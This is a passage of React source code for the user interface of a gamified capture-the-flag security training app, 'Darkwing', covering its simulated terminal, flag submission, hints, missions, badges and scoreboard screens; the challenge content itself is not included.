  const GCSS=`@keyframes blink{0%,100%{opacity:1}50%{opacity:0}} @keyframes slideDown{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:none}} @keyframes fadeOut{to{opacity:0}} @keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}} @keyframes duck{0%,100%{transform:rotate(-8deg)}50%{transform:rotate(8deg)}} @keyframes rankUp{from{transform:scale(0.5) rotate(-10deg);opacity:0}to{transform:scale(1);opacity:1}} @keyframes spin{from{transform:rotate(-20deg) scale(0.8)}to{transform:rotate(0)scale(1)}} @keyframes pingRing{0%{transform:scale(1);opacity:.5}100%{transform:scale(2.5);opacity:0}} @keyframes pulse{0%,100%{box-shadow:0 0 0 0 ${C.accent}99}50%{box-shadow:0 0 0 12px transparent}} *{box-sizing:border-box} ::-webkit-scrollbar{width:6px} ::-webkit-scrollbar-thumb{background:${C.purple};border-radius:3px} ::-webkit-scrollbar-track{background:${C.bgDeep}}`;

  // Route to special screens
  if(!onboarded) return <Onboarding onComplete={(h,m)=>{setSave(p=>({...p,onboarded:true,playerHandle:h,opMode:m}));setDuckyMsg(duck("welcome"));}}/>;
  if(screen==="settings") return <SettingsScreen C={C} save={save} onUpdate={(k,v)=>setSave(p=>({...p,[k]:v}))} onBack={()=>setScreen("home")} onReset={()=>{setSave(defaultSave());setScreen("home");}}/>;
  if(screen==="dossier")  return <OperatorDossier C={C} save={save} allChallenges={CTF_CHALLENGES} onBack={()=>setScreen("home")} onUnlock={unlockAchievement}/>;
  if(screen==="briefing"&&pendingChallenge) return <BriefingRoom C={C} challenge={pendingChallenge} opMode={opMode} onStart={startChallenge} onBack={()=>setScreen("home")}/>;

  // ── TERMINAL SCREEN FACTORY ───────────────────────────────────────
  const TermScreen=({title,category,subtitle,steps,stepIdx,lines,termRef,inputRef,inputVal,setInput,onCmd,typing,showFlag,flagVal,setFlagVal,flagRes,onSubmitFlag,onBack,showLesson,lessonContent,onComplete,isDaily,chalObj,xpLabel,replay})=>{
    const hints=chalObj?getChalHints(chalObj.id):null;
    const cc=category?catColor(category):C.accent;
    return (
      <div style={S.root}>
        <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet"/>
        <div style={S.scanlines}/><div style={S.vignette}/>
        {tokenAnim&&<div style={S.tokenToast}>{tokenAnim}</div>}
        <AchToast id={achToast} onDone={()=>setAchToast(null)} C={C}/>
        <RankUpModal rank={rankUpData} onClose={()=>setRankUpData(null)} C={C}/>

        <div style={S.hdr}>
          <button style={{...S.btn(),padding:"6px 14px",fontSize:16}} onClick={onBack}>← BACK</button>
          <div style={{fontSize:14,color:C.textDim,letterSpacing:1}}>{category&&catIcon(category)} {subtitle}</div>
          <div style={{display:"flex",alignItems:"center",gap:8}}>
            {replay&&<span style={{fontSize:14,color:C.gold,border:`1px solid ${C.gold}55`,padding:"2px 8px"}}>🔁 REPLAY</span>}
            <span style={{fontSize:19,color:C.gold}}>{xpLabel}</span>
          </div>
        </div>

        <div style={{flexShrink:0,padding:"10px 16px 7px",borderBottom:`1px solid ${C.slate}`}}>
          {isDaily&&<div style={{fontSize:13,color:C.gold,letterSpacing:3,marginBottom:3}}>📅 DAILY</div>}
          <div style={{fontSize:20,color:C.text,letterSpacing:1}}>{title}</div>
        </div>

        <div style={{flexShrink:0,display:"flex",gap:5,padding:"7px 16px",borderBottom:`1px solid ${C.slate}`}}>
          {steps.map((_,i)=><div key={i} style={{flex:1,height:5,background:i<stepIdx?C.accent:i===stepIdx?cc:C.slate,boxShadow:i===stepIdx?`0 0 6px ${cc}`:"none",transition:"all .3s",borderRadius:2}}/>)}
        </div>

        <div style={{flex:1,display:"flex",flexDirection:"column",minHeight:0,overflowY:"auto",overscrollBehavior:"contain"}}>
        {duckyMsg&&(
          <div style={{...S.duckyBox,flexShrink:0}}>
            <div style={{fontSize:26,lineHeight:1,flexShrink:0}}>🦆</div>
            <div style={{flex:1}}>
              <div style={{fontSize:13,color:C.gold,letterSpacing:3,marginBottom:3}}>DUCKY</div>
              <div style={{fontSize:16,color:C.text,lineHeight:1.55,whiteSpace:"pre-line"}}>{duckyMsg}</div>
            </div>
            <button onClick={()=>setDuckyMsg(null)} style={{background:"none",border:"none",color:C.textDim,fontSize:20,cursor:"pointer",padding:0}}>×</button>
          </div>
        )}

        <div style={{flex:1,display:"flex",flexDirection:"column",minHeight:0,padding:"4px 0 0"}}>
          <div style={S.termWrap}>
            <div style={S.termBar}>
              <div style={{width:11,height:11,borderRadius:"50%",background:C.red}}/>
              <div style={{width:11,height:11,borderRadius:"50%",background:C.gold}}/>
              <div style={{width:11,height:11,borderRadius:"50%",background:C.accent}}/>
              <span style={{fontSize:13,color:C.textDim,letterSpacing:1,flex:1}}>{(playerHandle||"op").toLowerCase()}@darkwing — {title}</span>
            </div>
            <div style={S.termBody} ref={termRef} onScroll={handleTermScroll}>
              {lines.map((l,i)=>renderLine(l,i))}
              {typing&&<span style={{color:C.accent,animation:"blink .5s infinite"}}>█</span>}
            </div>
            {!showFlag&&(
              <div style={S.termInput} onClick={()=>{if(inputRef.current){inputRef.current.focus();}}}>
                <span style={{color:C.termPrompt,fontSize:16,whiteSpace:"nowrap"}}>{(playerHandle||"op").toLowerCase()}@darkwing:~#</span>
                <input ref={inputRef} style={{...S.termField,opacity:typing?0.5:1}}
                  onChange={e=>{if(!typing)soundEngine.play("keypress");}}
                  onKeyDown={e=>{if(!typing)onCmd(e);}}
                  placeholder={typing?"executing...":"type command... (try: quack)"}
                  autoCapitalize="none" autoCorrect="off" spellCheck={false}
                  autoFocus={true}
                  readOnly={false}/>
              </div>
            )}
          </div>

          {!showFlag&&<CmdBar onSelect={cmd=>{if(inputRef.current){inputRef.current.value=cmd+" ";inputRef.current.focus();}}} category={category} C={C}/>}

          {chalObj&&!showFlag&&(
            <div style={{margin:"8px 14px 5px",flexShrink:0,display:"flex",justifyContent:"space-between",alignItems:"center",padding:"9px 14px",border:`1px solid ${C.slateHi}`,background:C.bgCard,cursor:"pointer"}} onClick={()=>setShowHints(p=>!p)}>
              <div style={{display:"flex",alignItems:"center",gap:10}}>
                <span style={{color:C.gold,fontSize:18}}>⚡</span>
                <span style={{fontSize:17,color:C.gold,letterSpacing:2}}>HINTS</span>
                {hints.penalty>0&&<span style={{fontSize:13,color:C.red,border:`1px solid ${C.red}55`,padding:"1px 7px"}}>{hints.unlocked.length} USED · -{hints.penalty}pts</span>}
              </div>
              <div style={{display:"flex",alignItems:"center",gap:8}}>
                <span style={{fontSize:17,color:C.gold}}>{hintTokens}🪙</span>
                <span style={{color:C.textDim,fontSize:17}}>{showHints?"▲":"▼"}</span>
              </div>
            </div>
          )}
          {chalObj&&showHints&&!showFlag&&<HintPanel challenge={chalObj} hintTokens={hintTokens} unlockedHints={hints.unlocked} penaltyTotal={hints.penalty} onSpend={(t,c,p)=>spendHint(chalObj.id,t,c,p)} C={C}/>}

          {showFlag&&(
            <div style={{...S.flagBox,flexShrink:0,margin:"8px 14px"}}>
              <div style={{fontSize:16,color:C.gold,letterSpacing:3,marginBottom:10}}>⚑ SUBMIT FLAG</div>
              {!isReplay&&hints?.penalty>0&&<div style={{fontSize:14,color:C.red,marginBottom:8}}>Hint penalty: -{hints.penalty}pts → Max: {Math.max(10,(chalObj?.points||0)-hints.penalty)}pts</div>}
              {replay&&<div style={{fontSize:14,color:C.teal,marginBottom:8}}>🔁 Replay mode — no points awarded, stars may improve</div>}
              {flagRes==="correct"?(
                <div>
                  <div style={{display:"flex",alignItems:"center",gap:10,marginBottom:6}}>
                    <span style={{fontSize:22,color:C.accent,textShadow:`0 0 10px ${C.accent}`}}>✓ CORRECT!</span>
                    {chalObj&&(starRatings||{})[chalObj.id]&&<Stars count={(starRatings||{})[chalObj.id]} size={22} C={C}/>}
                  </div>
                  <div style={{fontSize:17,color:C.gold,marginBottom:10}}>
                    {isDaily?`+${activeDaily?.bonusXP}XP +2🪙`:replay?`Stars updated!`:`+${Math.max(10,(chalObj?.points||0)-(hints?.penalty||0))}pts`}
                  </div>
                  {chalObj&&<div style={{fontSize:15,color:C.textDim,lineHeight:1.6,marginBottom:12}}>{chalObj.lesson}</div>}
                  <button style={{...S.btn("success"),width:"100%",fontSize:19}} onClick={()=>setScreen("home")}>BACK TO OPS</button>
                </div>
              ):(
                <div>
                  {flagRes==="wrong"&&<div style={{color:C.red,fontSize:17,marginBottom:8}}>✗ WRONG FLAG</div>}
                  <div style={{display:"flex",gap:8}}>
                    <input ref={isDaily?dailyFlagRef:flagRef} style={S.flagField} placeholder="CTF{...}" value={flagVal}
                      onChange={e=>setFlagVal(e.target.value)} onKeyDown={e=>e.key==="Enter"&&onSubmitFlag()}
                      autoCapitalize="none" autoCorrect="off" spellCheck={false}/>
                    <button style={{...S.btn("gold"),padding:"6px 14px"}} onClick={onSubmitFlag}>SUBMIT</button>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>{/* closes terminal area */}

        {showLesson&&(
          <div style={S.lessonBox}>
            <div style={{fontSize:14,color:C.gold,letterSpacing:4,marginBottom:8}}>◆ LESSON LEARNED</div>
            <div style={{fontSize:16,color:C.textDim,lineHeight:1.65}}>{lessonContent}</div>
            <div style={{marginTop:6}}>{activeMission?.tools.map(t=><span key={t} style={{display:"inline-block",fontSize:9,color:C.textFade,border:`1px solid ${C.slate}`,padding:"0 5px",margin:"2px"}}>{t}</span>)}</div>
            <button style={{...S.btn("primary"),width:"100%",fontSize:16,marginTop:12}} onClick={onComplete}>
              COLLECT +{activeMission?.xp}XP  +{activeMission?.tokenReward}🪙
            </button>
          </div>
        )}
        </div>{/* closes outer content area */}
        <style>{GCSS}</style>
      </div>
    );
  };

  if(screen==="challenge"&&activeChallenge) return TermScreen({title:activeChallenge.title,category:activeChallenge.category,subtitle:`${activeChallenge.category} · STEP ${Math.min(chalStepIdx+1,activeChallenge.steps.length)}/${activeChallenge.steps.length}`,xpLabel:`${activeChallenge.points}pts`,steps:activeChallenge.steps,stepIdx:chalStepIdx,lines:chalLines,termRef:chalTermRef,inputRef:chalInputRef,inputVal:chalInput,setInput:setChalInput,onCmd:handleChalCmd,typing:chalTyping,showFlag:chalShowFlag,flagVal:flagInput,setFlagVal:setFlagInput,flagRes:flagResult,onSubmitFlag:submitFlag,onBack:()=>setScreen("home"),chalObj:activeChallenge,replay:isReplay});
  if(screen==="daily"&&activeDaily) return TermScreen({title:activeDaily.title,category:activeDaily.category,subtitle:`DAILY · ${activeDaily.category}`,xpLabel:`+${activeDaily.bonusXP}XP`,steps:activeDaily.steps,stepIdx:dailyStepIdx,lines:dailyLines,termRef:dailyTermRef,inputRef:dailyInputRef,inputVal:dailyInput,setInput:setDailyInput,onCmd:handleDailyCmd,typing:dailyTyping,showFlag:dailyShowFlag,flagVal:dailyFlagInput,setFlagVal:setDailyFlagInput,flagRes:dailyFlagResult,onSubmitFlag:submitDailyFlag,onBack:()=>setScreen("home"),isDaily:true});
  if(screen==="mission"&&activeMission) return TermScreen({title:activeMission.title,category:activeMission.category,subtitle:`MISSION · ${activeMission.category}`,xpLabel:`+${activeMission.xp}XP`,steps:activeMission.steps,stepIdx:msnStepIdx,lines:msnLines,termRef:msnTermRef,inputRef:msnInputRef,inputVal:msnInput,setInput:setMsnInput,onCmd:handleMsnCmd,typing:msnTyping,showFlag:false,flagVal:"",setFlagVal:()=>{},flagRes:null,onSubmitFlag:()=>{},onBack:()=>setScreen("home"),showLesson:msnLesson,lessonContent:activeMission.lesson,onComplete:completeMission});

  // ── HOME ──────────────────────────────────────────────────────────
  const rank=getRank(totalXP||0);
  const nextRank=getNextRank(totalXP||0);
  const xpPct=nextRank?Math.min(100,((totalXP-rank.minXP)/(nextRank.minXP-rank.minXP))*100):100;
  const numSolved=Object.keys(solvedFlags||{}).length;
  const cats=["ALL",...new Set(CTF_CHALLENGES.map(c=>c.category))];

  return (
    <div style={S.root}>
      <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet"/>
      <div style={S.scanlines}/><div style={S.vignette}/>
      {tokenAnim&&<div style={S.tokenToast}>{tokenAnim}</div>}
      <AchToast id={achToast} onDone={()=>setAchToast(null)} C={C}/>
      <RankUpModal rank={rankUpData} onClose={()=>setRankUpData(null)} C={C}/>

      <div style={S.hdr}>
        <div>
          <div style={S.logo}>🦆 DARKWING</div>
          <div style={{fontSize:12,color:C.accent,letterSpacing:3}}>LET'S GET DANGEROUS</div>
        </div>
        <div style={{display:"flex",alignItems:"center",gap:10}}>
          <div style={{textAlign:"right"}}>
            <div style={{fontSize:17,color:rank.color,letterSpacing:1}}>{rank.icon} {rank.label}</div>
            <div style={{fontSize:14,color:C.gold}}>{hintTokens||0}🪙 · {totalXP||0}XP</div>
          </div>
          <button onClick={()=>{soundEngine.init();soundEngine.play("navigate");haptic.light();setScreen("settings");unlockAchievement("settings_found");}} style={{background:"none",border:`1px solid ${C.slateHi}`,color:C.textDim,fontSize:22,padding:"5px 10px",cursor:"pointer",fontFamily:"'VT323',monospace"}}>⚙</button>
        </div>
      </div>

      {nextRank&&(
        <div style={{padding:"7px 16px",background:C.bgDeep,borderBottom:`1px solid ${C.slate}`}}>
          <div style={{display:"flex",justifyContent:"space-between",marginBottom:4}}>
            <span style={{fontSize:14,color:C.textDim}}>{rank.label}</span>
            <span style={{fontSize:14,color:C.textDim}}>{nextRank.minXP-(totalXP||0)}XP to {nextRank.label}</span>
          </div>
          <div style={{height:5,background:C.slate,borderRadius:3}}>
            <div style={{height:"100%",width:`${xpPct}%`,background:`linear-gradient(90deg,${C.purple},${C.accent})`,borderRadius:3,transition:"width .5s",boxShadow:`0 0 6px ${C.accent}66`}}/>
          </div>
        </div>
      )}

      {duckyMsg&&(
        <div style={{...S.duckyBox,margin:"8px 14px"}}>
          <div style={{fontSize:26,lineHeight:1,flexShrink:0}}>🦆</div>
          <div style={{flex:1}}>
            <div style={{fontSize:13,color:C.gold,letterSpacing:3,marginBottom:3}}>DUCKY</div>
            <div style={{fontSize:16,color:C.text,lineHeight:1.55}}>{duckyMsg}</div>
          </div>
          <button onClick={()=>setDuckyMsg(null)} style={{background:"none",border:"none",color:C.textDim,fontSize:20,cursor:"pointer",padding:0}}>×</button>
        </div>
      )}

      {/* Daily banner */}
      <div style={{margin:"8px 14px",padding:"12px 16px",background:`${C.purple}28`,border:`1px solid ${C.gold}44`,borderLeft:`4px solid ${C.gold}`,cursor:dailySolved?"default":"pointer",opacity:dailySolved?0.6:1}} onClick={()=>{if(!dailySolved){soundEngine.init();soundEngine.play("daily");openDaily();}}}>
        <div style={{display:"flex",justifyContent:"space-between",alignItems:"center"}}>
          <div>
            <div style={{fontSize:13,color:C.gold,letterSpacing:3,marginBottom:3}}>📅 DAILY CHALLENGE</div>
            <div style={{fontSize:22,color:dailySolved?C.textDim:C.text}}>{dailySolved?"✓ COMPLETED TODAY":dailyChal.title}</div>
            <div style={{fontSize:15,color:C.textDim}}>+{dailyChal.bonusXP}XP · +2🪙 · Resets midnight</div>
          </div>
          {!dailySolved&&<div style={{fontSize:26,color:C.gold,animation:"blink 2s infinite"}}>▶</div>}
        </div>
      </div>

      {/* Stats */}
      <div style={{display:"flex",background:C.bgDeep,borderBottom:`1px solid ${C.slate}`,borderTop:`1px solid ${C.slate}`}}>
        {[{v:numSolved,l:"FLAGS"},{v:totalScore||0,l:"SCORE"},{v:(achievements||[]).length,l:"BADGES"}].map((s,i)=>(
          <div key={i} style={{flex:1,textAlign:"center",padding:"10px 4px",borderRight:i<2?`1px solid ${C.slate}`:"none"}}>
            <div style={{fontSize:36,color:C.accent,textShadow:`0 0 8px ${C.accent}55`}}>{s.v}</div>
            <div style={{fontSize:14,color:C.textDim,letterSpacing:2}}>{s.l}</div>
          </div>
        ))}
      </div>

      <div style={S.tabs}>
        {[["map","🗺 MAP"],["ctf","CTF ⚑"],["missions","MISSIONS"],["badges","BADGES"],["board","BOARD"]].map(([k,lbl])=>(
          <button key={k} style={S.tab(tab===k)} onClick={()=>{soundEngine.play("navigate");haptic.light();setTab(k);}}>
            {lbl}
          </button>
        ))}
      </div>

      {/* Dossier button */}
      <div style={{display:"flex",justifyContent:"flex-end",padding:"6px 14px",background:C.bgDeep,borderBottom:`1px solid ${C.slate}`}}>
        <button onClick={()=>{soundEngine.play("navigate");haptic.light();setScreen("dossier");}}
          style={{padding:"5px 14px",fontSize:14,letterSpacing:2,fontFamily:"'VT323',monospace",background:"transparent",border:`1px solid ${C.slateHi}`,color:C.textDim,cursor:"pointer"}}>
          🪪 DOSSIER
        </button>
      </div>

      {/* scrollable tab content */}
      <div style={{flex:1,overflowY:"auto",overscrollBehavior:"contain",WebkitOverflowScrolling:"touch"}}>

      {/* ── MAP ── */}
      {tab==="map"&&(
        <div style={{paddingBottom:40}}>
          <WorldMap solvedFlags={solvedFlags||{}} opMode={opMode} C={C}
            onCitySelect={city=>{
              setSave(prev=>({...prev,visitedCities:[...new Set([...(prev.visitedCities||[]),city.id])]}));
              const f=city.category.split("·")[0].trim();
              setFilterCat(f||"ALL");setTab("ctf");
              if((visitedCities||[]).length+1>=CITIES_FULL.length) unlockAchievement("map_explorer");
            }}/>
        </div>
      )}

      {/* ── CTF ── */}
      {tab==="ctf"&&(
        <div style={{paddingBottom:40}}>
          <div style={{display:"flex",overflowX:"auto",gap:6,padding:"9px 14px",borderBottom:`1px solid ${C.slate}`}}>
            {cats.map(c=>(
              <button key={c} onClick={()=>{soundEngine.play("navigate");haptic.light();setFilterCat(c);}}
                style={{padding:"5px 13px",fontSize:14,letterSpacing:1,background:filterCat===c?catColor(c)+"28":"transparent",border:`1px solid ${filterCat===c?catColor(c):C.slateHi}`,color:filterCat===c?catColor(c):C.textDim,cursor:"pointer",whiteSpace:"nowrap",fontFamily:"'VT323',monospace"}}>
                {c!=="ALL"?catIcon(c)+" ":""}{c}
              </button>
            ))}
          </div>
          <div style={{padding:"6px 16px 4px",fontSize:13,color:C.textDim,letterSpacing:2}}>
            {CTF_CHALLENGES.filter(c=>(filterCat==="ALL"||c.category===filterCat)&&(solvedFlags||{})[c.id]).length}/
            {CTF_CHALLENGES.filter(c=>filterCat==="ALL"||c.category===filterCat).length} CAPTURED
          </div>
          {CTF_CHALLENGES.filter(c=>filterCat==="ALL"||c.category===filterCat).map(chal=>{
            const solved=(solvedFlags||{})[chal.id];
            const locked=!isUnlocked(chal,solvedFlags||{});
            const cc=catColor(chal.category);
            const hints=getChalHints(chal.id);
            const stars=(starRatings||{})[chal.id]||0;
            return (
              <div key={chal.id} style={S.card(locked,!!solved)} onClick={()=>{if(!locked){soundEngine.init();soundEngine.play("navigate");haptic.light();initChallenge(chal,false);}}}>
                <div style={{position:"absolute",top:10,right:10,display:"flex",gap:8,alignItems:"center"}}>
                  {solved&&<Stars count={stars} size={14} C={C}/>}
                  {locked&&<span style={{fontSize:18,color:C.textFade}}>🔒</span>}
                  {solved&&!locked&&(
                    <button onClick={e=>{e.stopPropagation();soundEngine.init();soundEngine.play("replay");haptic.light();initChallenge(chal,true);}}
                      style={{fontSize:13,color:C.teal,border:`1px solid ${C.teal}55`,padding:"2px 8px",background:"transparent",fontFamily:"'VT323',monospace",cursor:"pointer",letterSpacing:1}}>
                      🔁 REPLAY
                    </button>
                  )}
                </div>
                <div style={{display:"flex",justifyContent:"space-between",marginBottom:6}}>
                  <div style={{fontSize:19,color:locked?C.textFade:solved?C.textDim:C.text,letterSpacing:1,paddingRight:90}}>{catIcon(chal.category)} {chal.title}</div>
                  <div style={{fontSize:16,color:solved?C.textDim:cc,border:`1px solid ${solved?C.textFade:cc}55`,padding:"0 8px",background:(solved?C.textFade:cc)+"14",flexShrink:0,marginTop:20}}>
                    {solved?`${solved.pts}/${chal.points}`:chal.points}
                  </div>
                </div>
                <div style={{fontSize:14,color:C.textDim,marginBottom:6}}>
                  <span style={{color:locked?C.textFade:cc,marginRight:10}}>{chal.category}</span>
                  <span style={{color:diffColor(chal.difficulty)}}>{chal.difficulty}</span>
                  {chal.city&&<span style={{color:C.textFade,marginLeft:10}}>{CITIES_FULL.find(c=>c.id===chal.city)?.flag} {CITIES_FULL.find(c=>c.id===chal.city)?.name}</span>}
                  {hints.penalty>0&&<span style={{color:C.red,marginLeft:10}}>-{hints.penalty}pts</span>}
                </div>
                <div style={{fontSize:15,color:locked?C.textFade:C.textDim,lineHeight:1.5}}>{chal.description}</div>
                {locked&&chal.requires?.length>0&&<div style={{fontSize:13,color:C.textFade,marginTop:5}}>🔒 Requires: {chal.requires.join(", ")}</div>}
                <div style={{marginTop:7}}>{chal.tags.map(t=><span key={t} style={{display:"inline-block",fontSize:12,color:locked?C.textFade:cc,border:`1px solid ${(locked?C.textFade:cc)}33`,padding:"0 6px",margin:"2px 3px"}}>{t}</span>)}</div>
              </div>
            );
          })}
        </div>
      )}

      {/* ── MISSIONS ── */}
      {tab==="missions"&&(
        <div style={{paddingBottom:40}}>
          <div style={{padding:"9px 16px 6px",fontSize:13,color:C.textDim,letterSpacing:2}}>GUIDED LEARNING — EARN HINT TOKENS</div>
          {MISSIONS.map(m=>{
            const done=(completedMissions||{})[m.id];
            return (
              <div key={m.id} style={S.card(false,done)} onClick={()=>{soundEngine.init();soundEngine.play("navigate");haptic.light();openMission(m);}}>
                {done&&<div style={{position:"absolute",top:10,right:10,fontSize:14,color:C.accent,letterSpacing:2}}>✓ DONE</div>}
                <div style={{display:"flex",justifyContent:"space-between",marginBottom:6}}>
                  <div style={{fontSize:19,color:done?C.textDim:C.text}}>{m.badge} {m.title}</div>
                  <div style={{textAlign:"right"}}>
                    <div style={{fontSize:16,color:done?C.textDim:C.gold}}>{m.xp}XP</div>
                    <div style={{fontSize:14,color:done?C.textFade:C.accent}}>+{m.tokenReward}🪙</div>
                  </div>
                </div>
                <div style={{fontSize:14,color:C.textDim,marginBottom:6}}>
                  <span style={{color:C.gold,marginRight:10}}>{m.category}</span>
                  <span style={{color:diffColor(m.difficulty)}}>{m.difficulty}</span>
                </div>
                <div style={{fontSize:15,color:C.textDim}}>{m.description}</div>
              </div>
            );
          })}
          <div style={{margin:"12px 14px",padding:"12px 14px",border:`1px dashed ${C.slateHi}`,fontSize:14,color:C.textFade,lineHeight:1.7}}>
            🦆 Complete missions to earn hint tokens.<br/>
            Secret: Type <span style={{color:C.accent}}>quack</span> in any terminal! 🦆
          </div>
        </div>
      )}

      {/* ── BADGES ── */}
      {tab==="badges"&&(
        <div style={{paddingBottom:40}}>
          <div style={{padding:"9px 16px 6px",fontSize:13,color:C.textDim,letterSpacing:2}}>{(achievements||[]).length}/{ACH_DEFS.length} UNLOCKED</div>
          {ACH_DEFS.map(ach=>{
            const unlocked=(achievements||[]).includes(ach.id);
            return (
              <div key={ach.id} style={{margin:"8px 14px",padding:"13px 16px",border:`1px solid ${unlocked?C.gold+"55":C.slateHi}`,background:unlocked?`${C.gold}0C`:C.bgCard,display:"flex",gap:14,alignItems:"center"}}>
                <div style={{fontSize:34,opacity:unlocked?1:0.2,flexShrink:0}}>{ach.icon}</div>
                <div style={{flex:1}}>
                  <div style={{fontSize:19,color:unlocked?C.gold:C.textFade,letterSpacing:1}}>{ach.label}</div>
                  <div style={{fontSize:14,color:C.textDim,marginTop:3}}>{ach.desc}</div>
                  <div style={{fontSize:13,color:unlocked?C.accent:C.textFade,marginTop:3}}>+{ach.xp}XP{unlocked?" · EARNED":""}</div>
                </div>
                {unlocked&&<div style={{fontSize:20,color:C.accent}}>✓</div>}
              </div>
            );
          })}
        </div>
      )}

      {/* ── BOARD ── */}
      {tab==="board"&&(
        <div style={{paddingBottom:40}}>
          <div style={{padding:"9px 16px 4px",fontSize:13,color:C.textDim,letterSpacing:2}}>LIVE SCOREBOARD</div>
          <div style={{display:"flex",padding:"6px 16px",borderBottom:`1px solid ${C.slate}`}}>
            {["#","HANDLE","SCORE","FLAGS"].map((h,i)=>(
              <div key={h} style={{fontSize:13,color:C.textFade,letterSpacing:2,flex:i===1?3:1,textAlign:i>1?"right":"left"}}>{h}</div>
            ))}
          </div>
          {(leaderboard||[]).map((row,i)=>(
            <div key={row.handle} style={S.boardRow(i,row.isPlayer)}>
              <div style={{flex:1,fontSize:17,color:i===0?C.gold:C.textDim}}>{i===0?"◆":i+1}</div>
              <div style={{flex:3}}>
                <div style={{fontSize:19,color:row.isPlayer?C.gold:C.text,textShadow:row.isPlayer?`0 0 8px ${C.gold}`:"none"}}>
                  {row.country} {row.isPlayer?playerHandle:row.handle}
                </div>
              </div>
              <div style={{flex:1,textAlign:"right",fontSize:20,color:row.isPlayer?C.gold:C.textDim}}>{row.score}</div>
              <div style={{flex:1,textAlign:"right",fontSize:17,color:C.textDim}}>{row.solves}</div>
            </div>
          ))}
          <div style={{margin:"16px 16px 6px",fontSize:13,color:C.textDim,letterSpacing:2}}>CATEGORY PROGRESS</div>
          {[...new Set(CTF_CHALLENGES.map(c=>c.category))].map(cat=>{
            const cc2=CTF_CHALLENGES.filter(c=>c.category===cat);
            const s2=cc2.filter(c=>(solvedFlags||{})[c.id]).length;
            const pct=cc2.length?(s2/cc2.length)*100:0;
            const col=catColor(cat);
            return (
              <div key={cat} style={{margin:"9px 16px 0"}}>
                <div style={{display:"flex",justifyContent:"space-between",marginBottom:4}}>
                  <span style={{fontSize:15,color:col}}>{catIcon(cat)} {cat}</span>
                  <span style={{fontSize:14,color:C.textDim}}>{s2}/{cc2.length}</span>
                </div>
                <div style={{height:5,background:C.slate,borderRadius:3}}>
                  <div style={{height:"100%",width:`${pct}%`,background:col,boxShadow:`0 0 5px ${col}`,transition:"width .4s",borderRadius:3}}/>
                </div>
              </div>
            );
          })}
        </div>
      )}

      </div>{/* end scrollable tab content */}

      <style>{GCSS}</style>
    </div>
  );
}
